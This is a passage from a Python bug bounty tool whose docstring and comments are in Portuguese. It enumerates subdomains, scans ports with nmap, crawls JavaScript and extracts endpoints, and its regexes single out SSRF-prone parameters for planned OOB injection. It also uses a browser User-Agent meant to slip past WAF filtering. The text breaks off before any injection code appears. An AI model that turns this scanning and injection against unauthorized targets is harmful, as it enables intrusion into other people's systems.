#!/usr/bin/env python3
"""
jsrecon_oob.py — JS Recon + OOB Injection para Bug Bounty
Uso EXCLUSIVO em programas com escopo autorizado.

PRINCÍPIO CENTRAL:
  Nenhum parâmetro é inventado. A ferramenta extrai do .js:
    - endpoints reais (path, query params, body params)
    - headers mencionados no código
  e injeta OOB APENAS nesses pontos.

Fluxo:
  Fase 1 — Recon JS
    subfinder / assetfinder → subdomínios
    nmap → portas abertas
    httpx → hosts vivos
    gau + waybackurls + gospider + katana → URLs históricas
    Playwright → JS carregado em runtime

  Fase 2 — Extração fiel de endpoints
    • Extrai paths, query params e body params LITERALMENTE do JS
    • Descarta template literals JS: ${P}, ${l}, ${A}
    • Descarta domínios externos ao target
    • Agrupa por método: endpoints_get.txt / post / put / patch
    • ZERO parâmetros inferidos por heurística de nome

  Fase 3 — OOB Injection
    • Injeta APENAS nos params que existem no JS extraído
    • UID como subdomínio ({ID}.{OOB}) — correlação DNS garantida
    • User-Agent realista em todas as requisições (HTTP e curl)
    • Rate limit global
    • Monitora interactsh-client em paralelo

Uso:
  python3 jsrecon_oob.py target.com -o abc123.oast.fun
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-nmap --workers 20
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --skip-recon
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-oob --workers 30
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --monitor-time 900

Dependências Python:
  pip install requests urllib3 playwright tenacity jsbeautifier
  playwright install chromium

Dependências Go:
  go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
  go install github.com/tomnomnom/assetfinder@latest
  go install github.com/projectdiscovery/httpx/cmd/httpx@latest
  go install github.com/lc/gau/v2/cmd/gau@latest
  go install github.com/tomnomnom/waybackurls@latest
  go install github.com/jaeles-project/gospider@latest
  go install github.com/projectdiscovery/katana/cmd/katana@latest
  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
"""

from __future__ import annotations

import argparse
import asyncio
import collections
import hashlib
import json
import logging
import re
import secrets
import shlex
import shutil
import subprocess
import sys
import threading
import time
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urljoin

import requests
from tenacity import (
    before_sleep_log, retry, retry_if_exception_type,
    stop_after_attempt, wait_exponential,
)

try:
    from playwright.async_api import async_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

try:
    import jsbeautifier
    HAS_BEAUTIFY = True
except ImportError:
    HAS_BEAUTIFY = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── User-Agent realista ──────────────────────────────────────────────────────
# Usado em TODAS as requisições HTTP e nos payloads curl/wget
# para evitar bloqueio por WAF/aplicações que filtram bots.
REAL_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36"
)
CURL_UA_FLAG = f'-A "{REAL_UA}"'

# ─── Portas ───────────────────────────────────────────────────────────────────
HTTP_PORTS  = [80,81,443,3000,3001,4000,4443,5000,6000,6443,6885,
               7077,8000,8080,8081,8181,8443,9000,9091,9443,9999,10000]
NMAP_PORTS  = ",".join(str(p) for p in sorted(set(HTTP_PORTS)))
HTTPS_PORTS = {443,8443,9443,4443,6443,10000}

# ─── CDNs — sempre descartados ────────────────────────────────────────────────
_CDN_RE = re.compile(
    r'(?:cdnjs\.cloudflare\.com|cdn\.jsdelivr\.net|unpkg\.com|'
    r'ajax\.googleapis\.com|stackpath\.bootstrapcdn\.com|'
    r'maxcdn\.bootstrapcdn\.com|code\.jquery\.com|'
    r'cdn\.datatables\.net|static\.cloudflareinsights\.com|'
    r'fonts\.googleapis\.com|fonts\.gstatic\.com)',
    re.I,
)

# ─── Cores ────────────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    @staticmethod
    def strip(s: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', s)

# ─── Logging ──────────────────────────────────────────────────────────────────
class _CleanFile(logging.FileHandler):
    def emit(self, record):
        record.msg = C.strip(str(record.msg))
        super().emit(record)

_log_lock = threading.Lock()

def setup_logging(log_file: Path) -> logging.Logger:
    lg = logging.getLogger("jsrecon_oob")
    lg.setLevel(logging.DEBUG)
    lg.handlers.clear()
    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", "%H:%M:%S")
    ch  = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))
    lg.addHandler(ch)
    fh = _CleanFile(log_file, encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)
    lg.addHandler(fh)
    return lg

def clog(lg: logging.Logger, msg: str, color: str = C.RESET, level: str = "info"):
    with _log_lock:
        getattr(lg, level)(f"{color}{msg}{C.RESET}")

# ─── Helpers gerais ───────────────────────────────────────────────────────────
def tool_ok(name: str) -> bool:
    return shutil.which(name) is not None

def run_cmd(cmd: list[str], lg: logging.Logger,
            stdin: str | None = None, timeout: int = 300) -> list[str]:
    try:
        r = subprocess.run(cmd, input=stdin, capture_output=True,
                           text=True, timeout=timeout)
        if r.stderr:
            lg.debug("[stderr:%s] %s", cmd[0], r.stderr.strip()[:200])
        return [l for l in r.stdout.splitlines() if l.strip()]
    except FileNotFoundError:
        lg.warning("Ausente: %s", cmd[0])
        return []
    except subprocess.TimeoutExpired:
        lg.warning("Timeout: %s", " ".join(cmd[:3]))
        return []
    except Exception as e:
        lg.error("Erro %s: %s", cmd[0], e)
        return []

def _write(path: Path, lines, lg: logging.Logger) -> None:
    content = [str(l) for l in lines if str(l).strip()]
    if not content:
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(content) + "\n", encoding="utf-8")
    lg.debug("Salvo: %s (%d linhas)", path, len(content))

def _append_line(path: Path, line: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as f:
        f.write(line + "\n")

# ─── UID collision-free ───────────────────────────────────────────────────────
_uid_seen: set[str] = set()
_uid_lock = threading.Lock()

def unique_id(category: str, param: str) -> str:
    cat  = re.sub(r'[^a-z0-9]', '', category.lower())[:3]
    par  = re.sub(r'[^a-z0-9]', '', param.lower())[:4]
    ts   = str(int(time.time() * 1000))
    rand = secrets.token_hex(3)
    uid  = f"{cat}-{ts}-{rand}-{par}"
    with _uid_lock:
        while uid in _uid_seen:
            uid = f"{cat}-{ts}-{secrets.token_hex(3)}-{par}"
        _uid_seen.add(uid)
    return uid

# ─── Rate limiter global ──────────────────────────────────────────────────────
class GlobalRateLimiter:
    def __init__(self, delay: float):
        self.delay = delay
        self._lock = threading.Lock()
        self._last = 0.0

    def acquire(self):
        with self._lock:
            now = time.time()
            gap = now - self._last
            if gap < self.delay:
                time.sleep(self.delay - gap)
            self._last = time.time()

_rate_limiter = GlobalRateLimiter(0.3)

# ─── PayloadLog ───────────────────────────────────────────────────────────────
class PayloadLog:
    def __init__(self, log_file: Path):
        self.log_file  = log_file
        self._by_uid:  dict[str, dict] = {}
        self._all:     list[dict]      = []
        self._lock     = threading.Lock()

    @property
    def entries(self) -> list[dict]:
        with self._lock:
            return list(self._all)

    def record(self, uid: str, url: str, param: str,
               category: str, payload: str) -> dict:
        entry = {
            "uid":       uid,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "unix_ts":   int(time.time() * 1000),
            "category":  category,
            "url":       url,
            "param":     param,
            "payload":   payload,
        }
        with self._lock:
            self._by_uid[uid] = entry
            self._all.append(entry)
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        return entry

    def find_fuzzy(self, raw_id: str) -> Optional[dict]:
        with self._lock:
            for uid, entry in self._by_uid.items():
                if uid in raw_id:
                    return entry
        return None

    def find_fuzzy_in_request(self, raw_request: str) -> Optional[dict]:
        with self._lock:
            for uid, entry in self._by_uid.items():
                if uid in raw_request:
                    return entry
        return None

    def load_existing(self):
        if self.log_file.exists():
            for line in self.log_file.read_text().splitlines():
                try:
                    e = json.loads(line)
                    self._by_uid[e["uid"]] = e
                    self._all.append(e)
                except Exception:
                    pass

# ─── Fase 1-A: Subdomínios ────────────────────────────────────────────────────
def enum_subdomains(domain: str, out: Path, lg: logging.Logger) -> set[str]:
    import os
    subs: set[str] = set()
    clog(lg, "\n━━━ Subdomínios ━━━", C.BLUE + C.BOLD)

    if tool_ok("subfinder"):
        lines = run_cmd(["subfinder", "-d", domain, "-silent"], lg, timeout=300)
        subs.update(lines)
        clog(lg, f"  subfinder: {len(lines)}", C.GREEN)
    if tool_ok("assetfinder"):
        lines = run_cmd(["assetfinder", "--subs-only", domain], lg, timeout=180)
        subs.update(lines)
        clog(lg, f"  assetfinder: {len(lines)}", C.GREEN)

    chaos_key = os.environ.get("CHAOS_KEY", "").strip()
    if tool_ok("chaos") and chaos_key:
        lines = run_cmd(["chaos", "-d", domain, "-key", chaos_key, "-silent"], lg, timeout=180)
        subs.update(lines)
        clog(lg, f"  chaos: {len(lines)}", C.GREEN)

    github_token = os.environ.get("GITHUB_TOKEN", "").strip()
    if tool_ok("github-subdomains") and github_token:
        lines = run_cmd(["github-subdomains", "-d", domain, "-t", github_token, "-raw"], lg, timeout=120)
        subs.update(lines)
        clog(lg, f"  github-subdomains: {len(lines)}", C.GREEN)

    clean = {s.strip().lower() for s in subs
             if s.strip() and "*" not in s and domain in s}
    clean.add(domain)
    _write(out / "subdomains.txt", sorted(clean), lg)
    clog(lg, f"  Total únicos: {len(clean)}", C.GREEN + C.BOLD)
    return clean

# ─── Fase 1-B: Nmap ───────────────────────────────────────────────────────────
def nmap_scan(subs: set[str], out: Path, lg: logging.Logger) -> dict[str, list[int]]:
    clog(lg, f"\n━━━ Nmap ({len(subs)} hosts) ━━━", C.BLUE + C.BOLD)
    if not tool_ok("nmap"):
        clog(lg, "  nmap ausente — assumindo 80/443", C.YELLOW)
        return {s: [80, 443] for s in subs}

    hosts_file = out / "_nmap_hosts.txt"
    _write(hosts_file, sorted(subs), lg)
    nmap_out = out / "nmap_results.txt"

    run_cmd(["nmap", "-iL", str(hosts_file), "-p", NMAP_PORTS,
             "--open", "-T4", "--max-retries", "1",
             "--host-timeout", "30s", "-oN", str(nmap_out), "-n"],
            lg, timeout=1800)

    open_ports: dict[str, list[int]] = {}
    if nmap_out.exists():
        current = None
        for line in nmap_out.read_text(errors="ignore").splitlines():
            hm = re.match(r'^Nmap scan report for (.+)', line)
            if hm:
                current = re.sub(r'\s*\(.*?\)', '', hm.group(1)).strip()
                open_ports.setdefault(current, [])
            pm = re.match(r'^(\d+)/tcp\s+open', line)
            if pm and current:
                open_ports[current].append(int(pm.group(1)))

    for s in subs:
        open_ports.setdefault(s, [])

    total = sum(len(v) for v in open_ports.values())
    clog(lg, f"  Portas abertas: {total}", C.GREEN)
    return open_ports

# ─── Fase 1-C: httpx ──────────────────────────────────────────────────────────
def httpx_probe(open_ports: dict[str, list[int]], out: Path,
                lg: logging.Logger) -> tuple[list[str], set[str]]:
    clog(lg, "\n━━━ httpx ━━━", C.BLUE + C.BOLD)

    candidates: set[str] = set()
    for host, ports in open_ports.items():
        for port in set(ports) | {80, 443}:
            scheme = "https" if port in HTTPS_PORTS else "http"
            candidates.add(f"{scheme}://{host}:{port}")
            if port == 443: candidates.add(f"https://{host}")
            if port == 80:  candidates.add(f"http://{host}")

    if not tool_ok("httpx"):
        clog(lg, "  httpx ausente — usando candidatos sem validação", C.YELLOW)
        urls = sorted(candidates)
        hosts = {urlparse(u).netloc.split(":")[0].lower() for u in urls}
        _write(out / "hosts_alive.txt", urls, lg)
        return urls, hosts

    clog(lg, f"  Testando {len(candidates)} candidatos...", C.CYAN)
    try:
        result = subprocess.run(
            ["httpx", "-silent", "-mc", "200,201,204,301,302,307,308,401,403",
             "-threads", "50", "-timeout", "8", "-follow-redirects",
             "-H", f"User-Agent: {REAL_UA}"],
            input="\n".join(sorted(candidates)) + "\n",
            capture_output=True, text=True, timeout=600,
        )
        urls_clean = [u.strip() for u in result.stdout.splitlines()
                      if u.strip().startswith("http")]
    except Exception as e:
        lg.error("httpx error: %s", e)
        urls_clean = sorted(candidates)

    confirmed = {urlparse(u).netloc.lower().split(":")[0] for u in urls_clean}
    _write(out / "hosts_alive.txt", sorted(set(urls_clean)), lg)
    clog(lg, f"  Hosts vivos: {len(urls_clean)}", C.GREEN + C.BOLD)
    return sorted(set(urls_clean)), confirmed

# ─── Fase 1-D: Coleta de JS ───────────────────────────────────────────────────
def _collect_js_single(domain: str, alive_urls: list[str],
                       lg: logging.Logger) -> set[str]:
    js: set[str] = set()
    clog(lg, "\n━━━ Coleta de JS (single-target) ━━━", C.BLUE + C.BOLD)

    if tool_ok("gau"):
        lines = run_cmd(["gau", "--blacklist",
                         "png,jpg,gif,svg,css,woff,woff2,ttf,eot,mp4",
                         domain], lg, timeout=300)
        before = len(js)
        for l in lines:
            if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                js.add(l.strip())
        clog(lg, f"  gau: +{len(js)-before}", C.GREEN)

    if tool_ok("waybackurls"):
        lines = run_cmd(["waybackurls", domain], lg, timeout=300)
        before = len(js)
        for l in lines:
            if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                js.add(l.strip())
        clog(lg, f"  waybackurls: +{len(js)-before}", C.GREEN)

    if tool_ok("gospider"):
        before = len(js)
        domain_urls = [u for u in alive_urls
                       if urlparse(u).netloc.lower().split(":")[0] == domain.lower()]
        for url in domain_urls[:10]:
            lines = run_cmd(
                ["gospider", "-s", url, "-d", "2", "-t", "5", "--js", "--quiet"],
                lg, timeout=120)
            for l in lines:
                m = re.search(r'https?://[^\s"\'<>]+\.js\b[^\s"\'<>]*', l)
                if m and not _CDN_RE.search(m.group(0)):
                    js_host = urlparse(m.group(0)).netloc.lower().split(":")[0]
                    if js_host == domain.lower():
                        js.add(m.group(0))
        clog(lg, f"  gospider: +{len(js)-before}", C.GREEN)

    js = {u for u in js if not u.endswith(".js.map")}
    clog(lg, f"  Total JS (single-target): {len(js)}", C.GREEN + C.BOLD)
    return js

def collect_js_tools(domain: str, alive_urls: list[str],
                     lg: logging.Logger) -> set[str]:
    js: set[str] = set()
    clog(lg, "\n━━━ Coleta de JS (ferramentas) ━━━", C.BLUE + C.BOLD)

    if tool_ok("gau"):
        lines = run_cmd(["gau", "--subs", "--blacklist",
                         "png,jpg,gif,svg,css,woff,woff2,ttf,eot,mp4",
                         domain], lg, timeout=300)
        before = len(js)
        for l in lines:
            if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                js.add(l.strip())
        clog(lg, f"  gau: +{len(js)-before}", C.GREEN)

    if tool_ok("waybackurls"):
        lines = run_cmd(["waybackurls", domain], lg, timeout=300)
        before = len(js)
        for l in lines:
            if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                js.add(l.strip())
        clog(lg, f"  waybackurls: +{len(js)-before}", C.GREEN)

    if tool_ok("gospider"):
        before = len(js)
        for url in alive_urls[:30]:
            lines = run_cmd(
                ["gospider", "-s", url, "-d", "2", "-t", "5", "--js", "--quiet"],
                lg, timeout=120)
            for l in lines:
                m = re.search(r'https?://[^\s"\'<>]+\.js\b[^\s"\'<>]*', l)
                if m and not _CDN_RE.search(m.group(0)):
                    js.add(m.group(0))
        clog(lg, f"  gospider: +{len(js)-before}", C.GREEN)

    if tool_ok("katana"):
        before = len(js)
        for url in alive_urls[:30]:
            lines = run_cmd(
                ["katana", "-u", url, "-d", "3", "-jc", "-silent"],
                lg, timeout=120)
            for l in lines:
                if ".js" in urlparse(l).path.lower() and not _CDN_RE.search(l):
                    js.add(l.strip())
        clog(lg, f"  katana: +{len(js)-before}", C.GREEN)

    js = {u for u in js if not u.endswith(".js.map")}
    clog(lg, f"  Total JS bruto: {len(js)}", C.GREEN + C.BOLD)
    return js

# ─── Fase 1-E: Playwright ─────────────────────────────────────────────────────
async def _pw_crawl(url: str, timeout_s: int, wait_s: int,
                    headless: bool, lg: logging.Logger) -> list[str]:
    """
    Captura todos os arquivos .js carregados pelo browser.

    Correções:
    - Usa "response" em vez de "request" para capturar JS da página FINAL
      após redirect HTTP→HTTPS (o request event dispara antes do redirect,
      o response event dispara na URL final já resolvida).
    - Se goto() falha com HTTP e a URL não é HTTPS, tenta automaticamente
      a versão HTTPS antes de desistir.
    - wait_until="load" em vez de "networkidle": networkidle aguarda 500ms
      sem requests, mas SPAs modernas fazem lazy-load de JS após interação.
      "load" captura o bundle principal e depois dormimos wait_s para lazy.
    - Extrai também srcs de <script src="..."> do DOM renderizado como
      fallback para JS injetados via innerHTML/document.write.
    """
    if not HAS_PLAYWRIGHT:
        return []

    found: list[str] = []
    seen:  set[str]  = set()

    def _accept(ru: str) -> bool:
        if ".js" not in urlparse(ru).path.lower():
            return False
        if _CDN_RE.search(ru):
            return False
        if ru in seen:
            return False
        return True

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=headless)
        ctx = await browser.new_context(
            user_agent=REAL_UA,
            ignore_https_errors=True,
        )
        page = await ctx.new_page()

        # ── "response" captura a URL final após todos os redirects ───────────
        def on_response(resp):
            ru = resp.url
            if _accept(ru):
                seen.add(ru)
                found.append(ru)

        page.on("response", on_response)

        # ── Tentativa 1: URL original ────────────────────────────────────────
        nav_ok = False
        try:
            await page.goto(url, timeout=timeout_s * 1000, wait_until="load")
            nav_ok = True
        except Exception as e:
            lg.debug("  [browser] goto(%s) falhou: %s", url, e)

        # ── Tentativa 2: fallback HTTPS se URL era HTTP ───────────────────────
        if not nav_ok and url.startswith("http://"):
            https_url = url.replace("http://", "https://", 1)
            lg.debug("  [browser] tentando HTTPS: %s", https_url)
            try:
                await page.goto(https_url, timeout=timeout_s * 1000, wait_until="load")
                nav_ok = True
                lg.debug("  [browser] HTTPS OK: %s", https_url)
            except Exception as e2:
                lg.debug("  [browser] HTTPS também falhou: %s", e2)

        if nav_ok:
            # Aguarda lazy-load de JS (SPAs injetam scripts após DOMContentLoaded)
            if wait_s > 0:
                await asyncio.sleep(wait_s)

            # ── Fallback DOM: extrai <script src="..."> do HTML renderizado ──
            try:
                script_srcs = await page.eval_on_selector_all(
                    "script[src]",
                    "els => els.map(e => e.src)"
                )
                for src in script_srcs:
                    if src and _accept(src):
                        seen.add(src)
                        found.append(src)
            except Exception as e:
                lg.debug("  [browser] eval script srcs: %s", e)

        await browser.close()

    return found


async def playwright_all(targets: list[str], headless: bool,
                         lg: logging.Logger) -> set[str]:
    """
    Roda _pw_crawl em cada target.

    Correção: prioriza a versão HTTPS de cada host antes de tentar HTTP.
    Se hosts_alive.txt contém tanto http://host quanto https://host,
    deduplica por netloc e usa sempre HTTPS quando disponível.
    """
    # Deduplica por netloc, preferindo HTTPS
    netloc_best: dict[str, str] = {}
    for url in targets:
        netloc = urlparse(url).netloc.lower()
        existing = netloc_best.get(netloc, "")
        if not existing or url.startswith("https://"):
            netloc_best[netloc] = url

    deduped = list(netloc_best.values())

    all_js: set[str] = set()
    for i, url in enumerate(deduped, 1):
        clog(lg, f"  [browser {i}/{len(deduped)}] {url}", C.CYAN)
        try:
            files = await _pw_crawl(url, timeout_s=35, wait_s=3,
                                    headless=headless, lg=lg)
            all_js.update(files)
            clog(lg, f"    → {len(files)} JS encontrados", C.GREEN if files else C.DIM)
        except Exception as e:
            lg.error("  [browser] %s: %s", url, e)

    return all_js

# ─── Fase 2: Filtro de endpoints ──────────────────────────────────────────────
_TMPL_LITERAL  = re.compile(r'\$\{[^}]*\}')
_JS_CONCAT     = re.compile(r'"\s*\+\s*\w|\w\s*\+\s*"')
_STATIC_EXT    = re.compile(
    r'\.(png|jpg|jpeg|gif|ico|svg|webp|woff|woff2|ttf|eot|css|map|txt|pdf|zip|gz)$',
    re.I
)
_ASSET_PATH    = re.compile(
    r'(?:/__webpack|/static/|/assets/|/dist/|/build/|\.chunk\.js|\.bundle\.js)',
    re.I
)
_TRAILING_JUNK = re.compile(r'[\\)\]]+$')
_BUILD_PATH    = re.compile(
    r'/(?:node_modules|builds/|src/locales|src/pages|\.cache)',
    re.I
)
_STATUS_CODE   = re.compile(r'^/\d{3}$')
_TOO_SHORT     = re.compile(r'^/[a-zA-Z0-9_]{1,3}$')

def is_valid_endpoint(path: str, target_domain: str,
                      confirmed_hosts: set[str]) -> tuple[bool, str]:
    if not path or len(path) < 3:
        return False, "too_short"
    if _TMPL_LITERAL.search(path):
        return False, "js_template_literal"
    if _JS_CONCAT.search(path):
        return False, "js_concat"

    path = _TRAILING_JUNK.sub("", path).rstrip("/") or path
    clean_path = path.split("?")[0]

    if _STATIC_EXT.search(clean_path):
        return False, "static_asset"
    if _ASSET_PATH.search(path):
        return False, "framework_asset"
    if _BUILD_PATH.search(path):
        return False, "build_path"
    if _STATUS_CODE.match(path):
        return False, "status_code_path"
    if _TOO_SHORT.match(path):
        return False, "too_short_path"

    if path.startswith(("http://", "https://", "ws://", "wss://")):
        try:
            host = urlparse(path).netloc.lower().split(":")[0]
        except Exception:
            return False, "parse_error"
        root = target_domain.lower().lstrip("*.")
        if host == root:
            return True, "ok"
        if host.endswith(f".{root}"):
            return True, "ok"
        if host in confirmed_hosts:
            return True, "ok"
        return False, f"external:{host}"

    if path.startswith("/"):
        return True, "ok"

    return False, "no_domain_no_slash"


def resolve_endpoint_url(path: str, js_url: str, target_domain: str) -> str:
    if path.startswith(("http://", "https://", "ws://", "wss://")):
        return path
    if path.startswith("/"):
        parsed = urlparse(js_url)
        if parsed.scheme and parsed.netloc:
            return f"{parsed.scheme}://{parsed.netloc}{path}"
        return f"https://{target_domain}{path}"
    return urljoin(js_url, path)

# ─── Padrões de extração de endpoints ─────────────────────────────────────────
def _endpoint_patterns() -> list[tuple[str, re.Pattern, str]]:
    Q  = r'[\x22\x27\x60]'
    NQ = r'[^\x22\x27\x60\s]'
    I  = re.I
    return [
        ("fetch_get",       re.compile(rf'(?:fetch|axios\.get|http\.get)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "GET"),
        ("fetch_post",      re.compile(rf'(?:fetch|axios\.post|http\.post)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "POST"),
        ("fetch_put",       re.compile(rf'(?:axios\.put|http\.put)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PUT"),
        ("fetch_delete",    re.compile(rf'(?:axios\.delete|http\.delete)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "DELETE"),
        ("fetch_patch",     re.compile(rf'(?:axios\.patch|http\.patch)\s*\(\s*{Q}({NQ}{{3,}}){Q}', I), "PATCH"),
        ("fetch_method",    re.compile(rf'fetch\s*\(\s*{Q}({NQ}{{3,}}){Q}\s*,\s*\{{[^}}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
        ("fetch_baseurl",   re.compile(r'(?:fetch|axios\.(?:get|post|put|patch|delete)|this\.\w+\.(?:get|post|put|patch))\s*\(\s*\x60\$\{[^}]+\}(/[a-zA-Z0-9/_\-]{2,}(?:\$\{[^}]*\}[a-zA-Z0-9/_\-]*)*)\x60', I), "ANY"),
        ("fetch_baseurl_m", re.compile(r'fetch\s*\(\s*\x60\$\{[^}]+\}(/[a-zA-Z0-9/_\-]{2,}[^\x60]*)\x60\s*,\s*\{[^}]*method\s*:\s*[\x22\x27](\w+)[\x22\x27]', I), "DYNAMIC"),
        ("xhr_open",        re.compile(rf'\.open\s*\(\s*[\x22\x27](\w+)[\x22\x27]\s*,\s*{Q}({NQ}{{3,}}){Q}', I), "XHR"),
        ("api_versioned",   re.compile(rf'{Q}(/api/v\d+[a-zA-Z0-9/_\-]*(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
        ("graphql",         re.compile(rf'{Q}((?:/graphql|/gql)(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "POST"),
        ("versioned_path",  re.compile(rf'{Q}(/v\d+/[a-zA-Z0-9/_\-]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}'), "ANY"),
        ("router_path",     re.compile(rf'(?:path|route|to|url)\s*:\s*{Q}(/[a-zA-Z0-9/_\-:]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "GET"),
        ("href_action",     re.compile(rf'(?:href|action)\s*[=:]\s*{Q}(/[a-zA-Z0-9/_\-\.]{{3,}}(?:\?[^\s\x22\x27\x60]*)?){Q}', I), "GET"),
        ("url_with_query",  re.compile(rf'{Q}((?:https?://[^\s\x22\x27\x60]+)?/[a-zA-Z0-9/_\-]{{2,}}\?(?:[a-zA-Z0-9_%\-]+=\w+&?)+){Q}', I), "GET"),
        ("websocket",       re.compile(rf'new\s+WebSocket\s*\(\s*{Q}(wss?://[^\s\x22\x27\x60]+){Q}', I), "WS"),
        ("env_url",         re.compile(rf'(?:apiUrl|baseUrl|endpointUrl|API_URL|BASE_URL)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "ANY"),
        ("webhook_url",     re.compile(rf'(?:webhookUrl|webhook_url|callbackUrl|callback_url|'
                                       rf'hookUrl|hook_url|notifyUrl|notify_url|'
                                       rf'ipnUrl|ipn_url|pingUrl|ping_url|'
                                       rf'returnUrl|return_url|successUrl|success_url)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "POST"),
        ("remote_asset",    re.compile(rf'(?:imageUrl|image_url|avatarUrl|avatar_url|'
                                       rf'thumbnailUrl|thumbnail_url|coverUrl|cover_url|'
                                       rf'fileUrl|file_url|documentUrl|doc_url|'
                                       rf'pdfUrl|pdf_url|feedUrl|feed_url|'
                                       rf'importUrl|import_url|exportUrl|export_url|'
                                       rf'remoteUrl|remote_url|fetchUrl|fetch_url|'
                                       rf'proxyUrl|proxy_url|externalUrl|external_url)\s*[:=]\s*{Q}({NQ}{{5,}}){Q}', I), "ANY"),
        ("path_param_ssrf", re.compile(rf'{Q}(/(?:fetch|proxy|render|load|download|import|export|'
                                       rf'preview|screenshot|pdf|convert|mirror|relay|'
                                       rf'forward|bridge|check|ping|validate|resolve)'
                                       rf'/[a-zA-Z0-9/_\-\.]{{2,}}){Q}', I), "GET"),
        ("graphql_url",     re.compile(rf'(?:importUrl|fetchUrl|uploadFromUrl|downloadUrl)'
                                       rf'\s*\([^)]*{Q}({NQ}{{5,}}){Q}', I), "POST"),
        ("iframe_src",      re.compile(rf'(?:iframe|frame|object|embed)[^>]*?src\s*=\s*{Q}({NQ}{{5,}}){Q}', I), "GET"),
        ("generic_path",    re.compile(rf'{Q}(/(?:api|v\d|auth|user|admin|account|login|logout|'
                                       rf'register|profile|settings|upload|download|search|'
                                       rf'order|payment|checkout|cart|webhook|hook|notify|'
                                       rf'callback|import|export|fetch|proxy|render)'
                                       rf'[a-zA-Z0-9/_\-]*){Q}', I), "ANY"),
    ]

ENDPOINT_PATTERNS = _endpoint_patterns()

_GET_LABELS: set[str] = {
    "fetch_get", "api_versioned", "versioned_path",
    "router_path", "href_action", "url_with_query",
    "generic_path", "path_param_ssrf", "iframe_src",
    "fetch_baseurl",
}
_POST_LABELS: set[str] = {
    "fetch_post", "fetch_put", "fetch_patch",
    "graphql", "graphql_url", "webhook_url",
}

# ─── Extração de body params do JS ───────────────────────────────────────────
#
# Três casos tratados:
#   1. JSON.stringify({ key: val })   — chaves SEM aspas (JS shorthand)
#   2. JSON.stringify({ "key": val }) — chaves COM aspas
#   3. JSON.stringify(VAR)            — variável: rastreia a definição no JS
#
# O regex antigo (_BODY_RE + _KEY_RE) falhava em (1) e (3), que são
# exatamente os padrões usados pelo JS minificado/beautificado moderno.

_BODY_SKIP: frozenset[str] = frozenset({
    'null', 'true', 'false', 'undefined', 'method', 'headers', 'body',
    'Content', 'Type', 'application', 'json', 'catch', 'then', 'ok',
    'status', 'length', 'error', 'const', 'let', 'var', 'await', 'async',
    'return', 'throw', 'new', 'Error', 'Promise', 'console', 'log', 'warn',
    'JSON', 'stringify', 'Object', 'Array', 'fetch', 'axios', 'http',
    'if', 'else', 'for', 'while', 'try', 'function', 'class',
})

_STRINGIFY_RE = re.compile(r'JSON\.stringify\s*\(\s*', re.I)
_UNQUOTED_KEY = re.compile(r'(?:^|[{,\s])([a-zA-Z_][a-zA-Z0-9_]{1,40})\s*:')
_QUOTED_KEY   = re.compile(r'["\']([a-zA-Z_][a-zA-Z0-9_]{1,40})["\']')


def _balance_braces(text: str, start: int) -> str:
    """Retorna o conteúdo do objeto JS a partir de '{' em start."""
    if start >= len(text) or text[start] != '{':
        return ""
    depth = 0
    i = start
    while i < len(text):
        if text[i] == '{':
            depth += 1
        elif text[i] == '}':
            depth -= 1
            if depth == 0:
                return text[start: i + 1]
        i += 1
    return text[start:]


def _keys_from_object(obj: str) -> list[str]:
    """
    Extrai chaves de PRIMEIRO NÍVEL de um objeto JS (com e sem aspas).

    Estratégia: remove as chaves { } externas, trabalha só com o
    interior, depois colapsa sub-objetos aninhados para {}.
    Assim as chaves do nível raiz ficam expostas e as internas somem.

    Ex: { lead: S, domain: A, scan_metrics: { overallScore: x } }
        -> ['lead', 'domain', 'scan_metrics']  (overallScore descartado)

    Bug anterior: re.sub colapsia o OBJETO RAIZ inteiro para {} quando
    ele não tinha sub-objetos — apagava tudo. Fix: stripa as chaves
    externas antes de colapsar.
    """
    # Strip das chaves externas: trabalha com o interior
    interior = obj.strip()
    if interior.startswith('{') and interior.endswith('}'):
